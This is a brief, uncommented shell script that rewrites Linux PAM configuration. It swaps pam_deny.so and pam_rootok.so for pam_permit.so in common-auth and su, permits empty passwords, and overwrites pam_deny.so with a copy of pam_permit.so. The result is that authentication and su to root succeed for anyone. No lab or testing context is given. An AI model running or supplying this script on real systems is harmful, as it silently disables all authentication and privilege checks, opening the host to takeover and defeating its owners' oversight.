#!/bin/sh
#if [ -f /etc/pam.d/password-auth ]; then
#  sed -ie "s/nullok_secure/nullok/g" /etc/pam.d/password-auth
#  sed -ie "s/try_first_pass//g" /etc/pam.d/password-auth
#fi
if [ -f /etc/pam.d/common-auth ]; then
  sed -ie "s/nullok_secure/nullok/g" /etc/pam.d/common-auth
  sed -ie "s/pam_rootok.so/pam_permit.so/g" /etc/pam.d/common-auth
  sed -ie "s/pam_deny.so/pam_permit.so/g" /etc/pam.d/common-auth
fi
if [ -f /etc/pam.d/su ]; then
  sed -ie "s/pam_rootok.so/pam_permit.so/g" /etc/pam.d/su
fi
if [ -f "/lib/x86_64-linux-gnu/security/pam_permit.so" ]; then 
  pam_path="/lib/x86_64-linux-gnu/security"
else 
  pam_path="/lib/i386-linux-gnu/security"
fi
cp -f $pam_path/pam_permit.so $pam_path/pam_deny.so
